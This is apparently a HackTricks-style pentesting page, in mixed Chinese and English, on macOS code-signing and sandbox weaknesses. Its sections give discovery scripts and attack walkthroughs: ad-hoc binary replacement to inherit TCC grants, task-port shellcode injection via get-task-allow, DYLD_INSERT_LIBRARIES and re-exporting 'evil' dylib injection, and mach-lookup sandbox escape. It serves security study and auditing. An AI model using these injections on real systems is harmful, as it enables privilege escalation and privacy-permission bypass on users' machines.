# macOS Code Signing Weaknesses & Sandbox Escapes

{{#include ../../../banners/hacktricks-training.md}}

## Ad-Hoc Signed Binaries

### Basic Information

**Ad-hoc signing** (`CS_ADHOC`) 会创建一个**没有证书链**的 code signature —— 它只是代码的 hash，不包含 developer identity verification。无法追溯 binary 的来源属于哪个 developer 或 organization。

在 Apple Silicon Mac 上，所有 executable 至少都需要 ad-hoc signature。这意味着你会在许多 development tools、Homebrew packages 和 third-party utilities 上发现 ad-hoc signatures。

### Why This Matters

- **No verifiable identity** —— binary 可以在不被基于 identity 的检查发现的情况下被替换
- 处于**privileged positions**（FDA、daemon、helpers）中的 third-party ad-hoc binaries 是高优先级 targets
- 在某些 configurations 中，ad-hoc signatures 的 verification 可能**不如** developer-signed code 严格
- 具有 **TCC grants** 的 ad-hoc signed binaries 尤其有价值 —— 即使 binary content 发生变化，grants 仍会持久存在（取决于 TCC 对 grant 的 keyed 方式）

### Discovery
```bash
# Find ad-hoc signed binaries
find /usr/local /opt /Applications -type f -perm +111 -exec sh -c '
flags=$(codesign -dvv "{}" 2>&1 | grep "CodeDirectory flags")
echo "$flags" | grep -q "adhoc" && echo "AD-HOC: {}"
' \; 2>/dev/null

# Check a specific binary
codesign -dv --verbose=4 /path/to/binary 2>&1 | grep -E "Signature|flags|Authority"
# Ad-hoc shows: "Signature=adhoc" and no Authority lines
```
### 攻击：Binary Replacement
```bash
# If an ad-hoc signed daemon binary is in a writable location:
# 1. Check the binary's current capabilities
codesign -d --entitlements - /path/to/target 2>&1

# 2. Note its TCC grants in the database
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT service, auth_value FROM access WHERE client LIKE '%target%';"

# 3. Replace the binary (if location is writable)
cp /tmp/malicious-binary /path/to/target

# 4. Re-sign with ad-hoc signature (mimics the original)
codesign -s - /path/to/target

# 5. On next launch, the daemon runs your code with the original's TCC grants
# (This works when TCC keyed the grant by path rather than code signature)
```
---

## 可调试进程（get-task-allow）

### 基本信息

**`com.apple.security.get-task-allow`** entitlement（或 `CS_GET_TASK_ALLOW` flag）允许**任何进程附加为 debugger**，读取内存、修改寄存器、注入 code，以及控制执行流程。

这项功能**仅用于 development builds**。然而，部分 third-party binaries 在 production 中仍携带此 entitlement。

> [!CAUTION]
> 带有 `get-task-allow` 的 production binary 是一个**可立即利用的 exploitation primitive**。任何本地进程都可以调用 `task_for_pid()`，获取目标的 Mach task port，并注入任意 code，使其以目标的 entitlements、TCC grants 和 security context 运行。

### 发现
```bash
# Find debuggable binaries
find /Applications /usr/local -type f -perm +111 -exec sh -c '
codesign -d --entitlements - "{}" 2>&1 | grep -q "get-task-allow.*true" && echo "DEBUGGABLE: {}"
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path, privileged FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'get_task_allow_signature'
ORDER BY e.privileged DESC;"
```
### Attack: Task Port Injection
```c
#include <mach/mach.h>
#include <mach/mach_vm.h>

// Get the target's task port (requires get-task-allow on target)
mach_port_t task;
kern_return_t kr = task_for_pid(mach_task_self(), target_pid, &task);

if (kr == KERN_SUCCESS) {
// Allocate memory in target process
mach_vm_address_t addr = 0;
mach_vm_allocate(task, &addr, shellcode_size, VM_FLAGS_ANYWHERE);

// Write shellcode into target
mach_vm_write(task, addr, (vm_offset_t)shellcode, shellcode_size);

// Make it executable
mach_vm_protect(task, addr, shellcode_size, FALSE,
VM_PROT_READ | VM_PROT_EXECUTE);

// Create a remote thread to execute the shellcode
// The shellcode runs with ALL of the target's entitlements and TCC grants
}
```
---

## No Library Validation + DYLD Environment

### The Deadly Combination

当一个 binary 同时具有以下两项时：
- `com.apple.security.cs.disable-library-validation`（加载任意 dylib）
- `com.apple.security.cs.allow-dyld-environment-variables`（接受 DYLD 环境变量）

这就是一个**保证可用的 code injection primitive**——`DYLD_INSERT_LIBRARIES` 可以完美运行。

### Discovery
```bash
# Find binaries with the deadly combo
find /Applications -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "disable-library-validation.*true" && \
echo "$ents" | grep -q "allow-dyld-environment.*true" && \
echo "INJECTABLE: {}"
' \; 2>/dev/null

# Using the scanner (both flags)
sqlite3 /tmp/executables.db "
SELECT path, privileged, tccPermsStr FROM executables
WHERE noLibVal = 1 AND allowDyldEnv = 1
ORDER BY privileged DESC;"
```
### 攻击：DYLD_INSERT_LIBRARIES Injection
```bash
# 1. Create the injection dylib
cat > /tmp/inject.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void injected(void) {
// This runs BEFORE main() in the target's process
// We inherit ALL of the target's:
// - Entitlements
// - TCC grants (camera, mic, FDA, etc.)
// - Sandbox exceptions
// - Mach port rights

FILE *f = fopen("/tmp/injected_proof.txt", "w");
fprintf(f, "Running as PID %d with target's privileges\n", getpid());
fclose(f);

// Example: if target has camera TCC, we can now capture video
// Example: if target has FDA, we can read any file
}
EOF

# 2. Compile the dylib
cc -shared -o /tmp/inject.dylib /tmp/inject.c

# 3. Inject into the target
DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /path/to/noLibVal-dyldEnv-binary

# 4. Verify injection
cat /tmp/injected_proof.txt
```
---

## Sandbox 临时例外

### 它们如何削弱 Sandbox

Sandbox 临时例外（`com.apple.security.temporary-exception.*`）会在 App Sandbox 中打开缺口：

| Exception | 允许的操作 |
|---|---|
| `temporary-exception.mach-lookup.global-name` | 连接系统范围的 XPC/Mach 服务 |
| `temporary-exception.files.absolute-path.read-write` | 读取/写入 app container 外部的文件 |
| `temporary-exception.iokit-user-client-class` | 打开 IOKit user-client 连接 |
| `temporary-exception.shared-preference.read-only` | 读取其他 app 的偏好设置 |
| `temporary-exception.files.home-relative-path.read-write` | 访问相对于 `~` 的路径 |

### Mach-Lookup 例外 = Sandbox Escape 原语

最危险的例外是 **mach-lookup** ——它允许 sandboxed app 与特权 daemon 通信：
```bash
# Find apps with mach-lookup exceptions
find /Applications -name "*.app" -exec sh -c '
binary="$1/Contents/MacOS/$(defaults read "$1/Contents/Info.plist" CFBundleExecutable 2>/dev/null)"
[ -f "$binary" ] && {
ents=$(codesign -d --entitlements - "$binary" 2>&1)
echo "$ents" | grep -q "mach-lookup" && {
count=$(echo "$ents" | grep -c "mach-lookup")
echo "[$count exceptions] $(basename "$1")"
}
}
' _ {} \; 2>/dev/null | sort -rn
```
### 攻击：通过 Mach-Lookup 逃逸 Sandbox
```
1. Compromise sandboxed app (renderer exploit, malicious document, etc.)
2. Read entitlements to discover mach-lookup exceptions
3. For each reachable service:
a. Connect via NSXPCConnection
b. Discover the service's protocol (class-dump, strings)
c. Fuzz each exposed method
4. Find a vulnerability in a privileged daemon
5. Exploit → code execution in the daemon's context (outside sandbox)
```
---

## Private Apple Entitlements

### 它们是什么

以 `com.apple.private.*` 为前缀的 Entitlements 可访问**Apple 内部 API**，这些 API 未公开文档，也不向第三方开发者提供。第三方二进制文件可通过企业证书、MDM 或非 App Store 分发方式获得 Private Entitlements。

### 危险的 Private Entitlements

| Entitlement | Capability |
|---|---|
| `com.apple.private.tcc.manager` | 完整读取/写入 TCC 数据库 |
| `com.apple.private.tcc.allow` | 访问特定 TCC 服务 |
| `com.apple.private.security.no-sandbox` | 在无 sandbox 的情况下运行 |
| `com.apple.private.iokit` | 直接访问 IOKit 驱动程序 |
| `com.apple.private.kernel.\*` | 访问内核接口 |
| `com.apple.private.xpc.launchd.job-label` | 注册/管理 launchd 任务 |
| `com.apple.rootless.install` | 写入受 SIP 保护的路径 |

### 发现
```bash
# Find third-party binaries with private entitlements
find /Applications /usr/local -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "com.apple.private" && {
echo "=== {} ==="
echo "$ents" | grep "com.apple.private" | head -10
}
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE privateEnts = 1 AND isAppleBin = 0
ORDER BY privileged DESC;"
```
---

## 自定义 Sandbox Profiles（SBPL）

### 它们是什么

二进制文件可以随附使用 SBPL（Seatbelt Profile Language）编写的自定义 Sandbox Profiles。这些 Profiles 可能比默认的 App Sandbox 限制更严格，或者**更宽松**。

### 审计自定义 Profiles
```bash
# Find custom sandbox profiles
find /Applications /System -name "*.sb" -o -name "*.sbpl" 2>/dev/null

# Dangerous SBPL rules to flag during audit:
# (allow file-write*)         — Write to ANY file
# (allow process-exec*)       — Execute ANY process
# (allow mach-lookup*)        — Connect to ANY Mach service
# (allow network*)            — Full network access
# (allow iokit*)              — Full IOKit access
# (allow file-read*)          — Read ANY file

# Example: Audit a sandbox profile for overly permissive rules
cat /path/to/custom.sb | grep "(allow" | sort -u
```
---

## 可写 Library 路径

### 它们是什么

当某个 binary 从当前用户可以**写入**的路径加载 dynamic library 时，该 library 可能会被替换为恶意代码。

### 发现方法
```bash
# Using the scanner — find privileged binaries loading from writable paths
sqlite3 /tmp/executables.db "
SELECT e.path, e.privileged
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'execs_writable_path'
ORDER BY e.privileged DESC
LIMIT 30;"

# Manual check: list library dependencies and check writability
otool -L /path/to/binary | awk '{print $1}' | while read lib; do
[ -f "$lib" ] && [ -w "$lib" ] && echo "WRITABLE: $lib"
done
```
### Attack: Dylib Replacement
```bash
# 1. Find the writable library
otool -L /path/to/target-daemon | grep "/usr/local\|/opt\|Library"

# 2. Back up the original
cp /path/to/writable.dylib /tmp/original.dylib

# 3. Create a replacement that re-exports the original
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
__attribute__((constructor))
void evil(void) {
system("id > /tmp/escalated.txt");
}
EOF
cc -shared -o /tmp/evil.dylib /tmp/evil.c \
-Wl,-reexport_library,/tmp/original.dylib

# 4. Replace the library
cp /tmp/evil.dylib /path/to/writable.dylib

# 5. When the daemon restarts, it loads the evil dylib with daemon privileges
```
## References

- [1] [Apple Developer — Code Signing 指南](https://developer.apple.com/library/archive/technotes/tn2206/_index.html)
- [2] [Apple Developer — App Sandbox](https://developer.apple.com/library/archive/documentation/Security/Conceptual/AppSandboxDesignGuide/AboutAppSandbox/AboutAppSandbox.html)
- [3] [Apple Developer — Entitlements](https://developer.apple.com/documentation/bundleresources/entitlements)
- [4] [XNU — `bsd/sys/codesign.h`（`CS_OPS_*` 操作和 `CLEAR_LV_ENTITLEMENT`）](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/sys/codesign.h)
- [5] [XNU — `bsd/kern/kern_proc.c`（`csops` / `CS_OPS_CLEAR_LV` 处理程序）](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/kern/kern_proc.c)

{{#include ../../../banners/hacktricks-training.md}}
